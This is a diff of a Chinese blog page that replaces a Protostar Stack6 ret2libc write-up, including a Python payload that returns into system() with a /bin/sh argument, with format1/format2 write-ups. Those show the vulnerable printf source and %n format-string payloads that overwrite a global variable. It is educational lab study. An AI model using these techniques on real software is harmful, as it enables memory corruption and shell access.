@@ -79,28 +79,30 @@
 
 
 
-<meta name="description" content="接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。">
+<meta name="description" content="开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。">
 <meta name="keywords" content="Binary-Hacking">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Liveoverflow-0x0F-ret2libc">
-<meta property="og:url" content="http://yoursite.com/2018/10/05/Liveoverflow-0x0F-ret2libc/index.html">
+<meta property="og:title" content="Liveoverflow-0x11-format1-2">
+<meta property="og:url" content="http://yoursite.com/2018/10/09/Liveoverflow-0x11-format1-2/index.html">
 <meta property="og:site_name" content="Muirelle的博客">
-<meta property="og:description" content="接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。">
+<meta property="og:description" content="开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/jBRgx3l.png">
-<meta property="og:image" content="https://i.imgur.com/SLCfmFW.png">
-<meta property="og:image" content="https://i.imgur.com/mMH8TcG.png">
-<meta property="og:image" content="https://i.imgur.com/KXYHfXc.jpg">
-<meta property="og:image" content="https://i.imgur.com/X6admMm.png">
-<meta property="og:image" content="https://i.imgur.com/bFpS7BD.png">
-<meta property="og:image" content="https://i.imgur.com/6PN7c3h.png">
-<meta property="og:image" content="https://i.imgur.com/BAWzxYv.png">
-<meta property="og:image" content="https://i.imgur.com/9Vo93dm.png">
-<meta property="og:updated_time" content="2018-10-07T03:08:06.420Z">
+<meta property="og:image" content="https://i.imgur.com/VvqynVS.png">
+<meta property="og:image" content="https://i.imgur.com/2LBqcLs.png">
+<meta property="og:image" content="https://i.imgur.com/6s1jtuR.png">
+<meta property="og:image" content="https://i.imgur.com/kfGP1rF.png">
+<meta property="og:image" content="https://i.imgur.com/PXabIHL.png">
+<meta property="og:image" content="https://i.imgur.com/8X2M3sb.png">
+<meta property="og:image" content="https://i.imgur.com/90t2JVi.png">
+<meta property="og:image" content="https://i.imgur.com/n8D20eR.png">
+<meta property="og:image" content="https://i.imgur.com/0oo5ERd.jpg">
+<meta property="og:image" content="https://i.imgur.com/hK3FWGF.png">
+<meta property="og:image" content="https://i.imgur.com/9dkSPmD.png">
+<meta property="og:updated_time" content="2018-10-12T12:12:05.297Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Liveoverflow-0x0F-ret2libc">
-<meta name="twitter:description" content="接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。">
-<meta name="twitter:image" content="https://i.imgur.com/jBRgx3l.png">
+<meta name="twitter:title" content="Liveoverflow-0x11-format1-2">
+<meta name="twitter:description" content="开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。">
+<meta name="twitter:image" content="https://i.imgur.com/VvqynVS.png">
 
 
 
@@ -130,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/05/Liveoverflow-0x0F-ret2libc/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/09/Liveoverflow-0x11-format1-2/"/>
 
 
 
 
 
-  <title>Liveoverflow-0x0F-ret2libc | Muirelle的博客</title>
+  <title>Liveoverflow-0x11-format1-2 | Muirelle的博客</title>
   
 
 
@@ -263,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/Liveoverflow-0x0F-ret2libc/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/Liveoverflow-0x11-format1-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Muirelle">
@@ -280,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Liveoverflow-0x0F-ret2libc</h1>
+          <h1 class="post-title" itemprop="name headline">Liveoverflow-0x11-format1-2</h1>
         
 
         <div class="post-meta">
@@ -292,8 +294,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-05T20:26:14+08:00">
-                2018-10-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-09T22:23:36+08:00">
+                2018-10-09
               </time>
             
 
@@ -330,86 +332,118 @@
       
 
       
-        <p>接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。</p>
+        <p>开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。</p>
 <a id="more"></a>
-<p>同样翻来覆去看了很多遍，可能比上个视频看的次数还多，但是一直没理解透彻，这两天又拿出来看了几遍，不知道为什么就豁然开朗了，，，赶紧趁热写进博客。</p>
 <p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p>
 <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><hr>
-<h2 id="Protostar-Stack6"><a href="#Protostar-Stack6" class="headerlink" title="Protostar Stack6"></a>Protostar Stack6</h2><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>Stack6 looks at what happens when you have restrictions on the return address.</strong></p>
-<p><strong>This level can be done in a couple of ways, such as finding the duplicate of the playload (odjdump -s will help with this), or ret2libc, or even return orientated programming.</strong></p>
-<p><strong>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</strong></p>
-<p><strong>This level is at /opt/protostar/bin/stack6</strong></p>
+<h2 id="Protostar-Format1"><a href="#Protostar-Format1" class="headerlink" title="Protostar Format1"></a>Protostar Format1</h2><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level shows how format strings can be used to modify arbitrary memory locations.</strong></p>
+<p><strong>Hints</strong></p>
+<ul>
+<li>objdump -t is your friend, and your input string lies far up the stack :)</li>
+</ul>
+<p>This level is at /opt/protostar/bin/format1</p>
 <pre><code>#include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
-void getpath()
+int target;
+
+void vuln(char *string)
 {
-  char buffer[64];
-  unsigned int ret;
-  printf(&quot;input path please: &quot;); fflush(stdout);
-  gets(buffer);
-  ret = __builtin_return_address(0);
-  if((ret &amp; 0xbf000000) == 0xbf000000) {
-      printf(&quot;bzzzt (%p)\n&quot;, ret);
-      _exit(1);
+  printf(string);
+
+  if(target) {
+      printf(&quot;you have modified the target :)\n&quot;);
   }
-  printf(&quot;got path %s\n&quot;, buffer);
 }
 
 int main(int argc, char **argv)
 {
-  getpath();
+  vuln(argv[1]);
 }
 </code></pre><hr>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>同样，先看源码。发现和stack5差不多，只不过多了下面这些东西。</p>
-<pre><code>ret = __builtin_return_address(0);
-if((ret &amp; 0xbf000000) == 0xbf000000) {
-      printf(&quot;bzzzt (%p)\n&quot;, ret);
-      _exit(1);
-  }
-</code></pre><p><strong>__builtin_return_address()</strong>作用是获取当前函数的返回地址，配合下面的if语句，这段代码想表达的就是：检查当前函数返回地址，如果是0xbf开头，就强制退出，否则就继续执行下面的代码。</p>
-<p>以0xbf开头的地址？是什么意思呢？打开gdb看一下</p>
-<p><img src="https://i.imgur.com/jBRgx3l.png" alt=""></p>
-<p>被安排的明明白白，所有0xbf开头的地址都是栈。在stack5中，我们通过控制返回地址把eip返回到栈中，以此来执行我们的shellcode，如果我们现在仍然把返回地址修改到栈里就会被exit()终止程序，shellcode也不可能得到执行了。</p>
-<p>题目也说了有很多办法可以解决这个问题，你可以直接将返回地址覆盖为ret这个命令本身所在的地址，也就是当ret执行后，它返回的目的地是ret本身。这就相当于把栈中的返回地址pop出来，结果下一个命令还是ret，于是刚才返回地址的后面一个地址才变成了真正的返回地址，你可以随意操控这个地址，指向栈中也没有关系，因为刚刚的第一个ret已经绕过了if语句的检查，后面的操作就和stack5没什么区别了，本篇文章主要讲ret2libc，所以这里就不细讲这个方法了。</p>
-<p>还有一个方法就是ret2libc，其实全称就是return to libc，顾名思义：<strong>返回到libc</strong></p>
-<p>这篇文章很值得参考<br>链接：<a href="https://www.shellblade.net/docs/ret2libc.pdf" target="_blank" rel="noopener">https://www.shellblade.net/docs/ret2libc.pdf</a></p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在说思路之前先做一些铺垫，libc其实是linux下的ansi c函数库，说白了，ret2libc就是返回到libc中的某个函数，我们选择system函数，因为system可以让我们执行shell command。光是返回到system没有什么用，我们要用它帮我们执行一些命令，当然是/bin/sh了，这样我们直接就拿到shell了。</p>
-<p>现在我们有了一个大致思路，就是将返回地址覆盖为system的地址，然后将/bin/sh的地址作为参数传给system。但是一个新的问题出现了，返回地址被system地址覆盖后，要把/bin/sh放在哪儿，才能保证system接收到这个参数？</p>
-<p>先看一个例子</p>
-<p>写一小段程序，看看是怎么传参的</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先运行一下，运行时带上字符串参数，程序就会原样的将字符串打印出来，这也是预料之内的事。但是有一个问题，我们可以控制的是printf里的哪个参数？<br><img src="https://i.imgur.com/VvqynVS.png" alt=""><br><strong>man printf</strong>看一下<br><img src="https://i.imgur.com/2LBqcLs.png" alt=""></p>
+<p>再看一眼源码，显然我们控制的是第一个format string(格式化字符串)，这就意味着我们可以在要打印字符串里面加上一些格式化输出，比如%d，%x等。那就先试试%d，%x能打印出什么。<br><img src="https://i.imgur.com/6s1jtuR.png" alt="">%d打印的东西看不出什么蹊跷，但是%x打印的东西就非常熟悉了，经过前面几章的学习可以很容易联想到是栈地址。但是为什么会打印一些看似随机的地址？</p>
+<p>由于我们只控制了printf的第一个参数，而且也没有第二个参数，所以printf找不到需要被打印的内容的地址，所以就只有在栈里面随机找地址打印里面的内容。</p>
+<p>嗯，，然后呢？知道了这些信息有什么用？</p>
+<p><strong>man 3 printf</strong>看看有什么可用的信息。<br><img src="https://i.imgur.com/kfGP1rF.png" alt="">可以看到，手册里提醒我们如果printf里包含%n则可能造成安全隐患。</p>
+<p><img src="https://i.imgur.com/PXabIHL.png" alt="">意思是参数必须是一个整型指针，并且会把%n前面打印的所有字符个数写入这个地址。</p>
+<p>写个小程序测试一下</p>
 <pre><code>#include&lt;stdio.h&gt;
-void foo(int x)
-{
-        x++;
-}
 int main()
 {
-        foo(2);
-        return 0;
+        int a;
+        printf(&quot;abcd %n\n&quot;, &amp;a);
+        printf(&quot;a = %d\n&quot;, a);
 }
-</code></pre><p>放到gdb里面看</p>
-<p><img src="https://i.imgur.com/SLCfmFW.png" alt=""></p>
-<p>可以看到在调用foo()之前已经将参数压入栈顶，然后在调用foo()时会把返回值也压入栈中，foo函数也有自己的栈帧，所以紧接着的命令就是<strong>push ebp</strong>，最后栈就变成了这个样子：</p>
-<p><img src="https://i.imgur.com/mMH8TcG.png" alt=""></p>
-<p>可见,原来的ebp(红框)，返回地址(蓝框)，参数(绿框)依次排列在栈中，参数的位置就是<strong>ebp+0x8</strong>，这只是传了一个参数的函数，多个参数就以此类推，<strong>ebp+0xc</strong>，<strong>ebp+0x10</strong>。就算是libc中的system函数也不例外，system只接收一个参数，所以可以确定/bin/sh放置的位置就是<strong>ebp+0x8</strong></p>
-<p>下面是思路</p>
-<p><img src="https://i.imgur.com/KXYHfXc.jpg" alt=""></p>
-<p>所以现在只需要找到system和/bin/sh的地址就行了</p>
-<p>system的地址<br><img src="https://i.imgur.com/X6admMm.png" alt=""></p>
-<p><strong>(gdb)i proc mapping</strong>可以找到libc的地址<br><img src="https://i.imgur.com/bFpS7BD.png" alt=""><br>因为/bin/sh在libc中，所以只需要找到/bin/sh的偏移地址再把两个地址相加就是/bin/sh的地址了</p>
-<p>用下面的命令找到/bin/sh偏移地址<br><img src="https://i.imgur.com/6PN7c3h.png" alt=""><br>验证一下，没问题</p>
-<p><img src="https://i.imgur.com/BAWzxYv.png" alt=""></p>
-<p>可以开始写脚本了</p>
-<pre><code>import struct
-padding = &quot;A&quot;*20
-system = struct.pack(&quot;I&quot;, 0xb7ecffb0)
-return_after_system = &quot;AAAA&quot;
-bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf)
-print padding + system + return_after_system + bin_sh
-</code></pre><p>运行<br><img src="https://i.imgur.com/9Vo93dm.png" alt=""><br>成功;)</p>
+</code></pre><p><img src="https://i.imgur.com/8X2M3sb.png" alt="">空格也算在内，没毛病</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>再回顾一下题目，所以现在肯定是用%n将target的值覆盖掉。</p>
+<p>先找到target的地址 <strong>objdump -t ./format1 | grep “target”</strong><br><img src="https://i.imgur.com/90t2JVi.png" alt=""></p>
+<p>然后试着多打印点栈里的值<br><img src="https://i.imgur.com/n8D20eR.png" alt=""><br>后面一直重复出现的25782e其实就是 <strong>%x.</strong> 的ascii码，这样就有一个明确的思路了。如下图</p>
+<p><img src="https://i.imgur.com/0oo5ERd.jpg" alt=""><br>printf找到我们输入的第一个%x之后会在栈中随机找个地址打印其内容，后面的%x也就跟着打印前面那个地址后面的内容，直到%x的数量足够多时，后面的%x开始打印前面%x.的信息，也就是刚刚看到的25782e。如果我们把其中的一个%x改成%n会发生什么？</p>
+<p>假设上图的倒数第二排第一个%x改成了%n，显然，这时printf会将252e7825(<strong>%x.%</strong>)当作一个地址，然后将前面打印的所有字符个数都写入这个地址中去，所以我们要做的就是构造字符串，将那个地址改为target的地址，再用%n将数据写入。</p>
+<p><img src="https://i.imgur.com/hK3FWGF.png" alt=""><br>多次尝试后成功修改target的值</p>
+<p><strong>2018/10/12更新</strong></p>
+<h2 id="Protostar-Format2"><a href="#Protostar-Format2" class="headerlink" title="Protostar Format2"></a>Protostar Format2</h2><hr>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+  printf(buffer);
+
+  if(target == 64) {
+      printf(&quot;you have modified the target :)\n&quot;);
+  } else {
+      printf(&quot;target is %d :(\n&quot;, target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+</code></pre><hr>
+<p>format2和1差不多，只不过规定了target的值为64。</p>
+<p>找地址<br><img src="https://i.imgur.com/9dkSPmD.png" alt=""></p>
+<pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;%x &apos;*100&quot; | ./format2
+200 b7fd8420 bffff624 25207825 78252078 20782520 
+25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 
+25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 
+25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 
+25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 
+25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 b7e9000a b7ffb71c bffff734 
+b7fffbe8 e b7ea36e4 b7fe1afc f63d4e2e 0 3 b7fff8f8 
+0 0 1 892 b7fe1b28 b7fe1848 8048285 b7ea3f14 
+80481f4 1 b7ffeff4
+target is 0 :(
+</code></pre><p>找偏移</p>
+<pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x&apos;*4&quot; | ./format2
+AAAA200b7fd8420bffff62441414141
+target is 0 :(
+</code></pre><p>200b7fd8420bffff624有19个字节，64-19-4=41，减4是因为target的地址占了四个字节，虽然这四个字节是不可打印的，但是%n还是要把它们算在里面，所以还要构造41个字节</p>
+<pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;\xe4\x96\x04\x08&apos;+&apos;A&apos;*41+&apos;%x&apos;*3+&apos;%n&apos;&quot; | ./format2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd8420bffff624
+you have modified the target :)
+</code></pre><p>成功修改</p>
 
       
     </div>
@@ -440,8 +474,8 @@ print padding + system + return_after_system + bin_sh
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/03/Liveoverflow-0x0E-Shellcode/" rel="next" title="Liveoverflow-0x0E-Shellcode">
-                <i class="fa fa-chevron-left"></i> Liveoverflow-0x0E-Shellcode
+              <a href="/2018/10/05/Liveoverflow-0x0F-ret2libc/" rel="next" title="Liveoverflow-0x0F-ret2libc">
+                <i class="fa fa-chevron-left"></i> Liveoverflow-0x0F-ret2libc
               </a>
             
           </div>
@@ -449,10 +483,6 @@ print padding + system + return_after_system + bin_sh
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/09/Liveoverflow-0x11-format1-2/" rel="prev" title="Liveoverflow-0x11-format1-2">
-                Liveoverflow-0x11-format1-2 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -584,7 +614,7 @@ print padding + system + return_after_system + bin_sh
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Protostar-Stack6"><span class="nav-number">1.1.</span> <span class="nav-text">Protostar Stack6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.2.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思路"><span class="nav-number">3.</span> <span class="nav-text">思路</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Protostar-Format1"><span class="nav-number">1.1.</span> <span class="nav-text">Protostar Format1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.2.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思路"><span class="nav-number">3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Protostar-Format2"><span class="nav-number">3.1.</span> <span class="nav-text">Protostar Format2</span></a></li></ol></li></ol></div>
             
 
           </div>
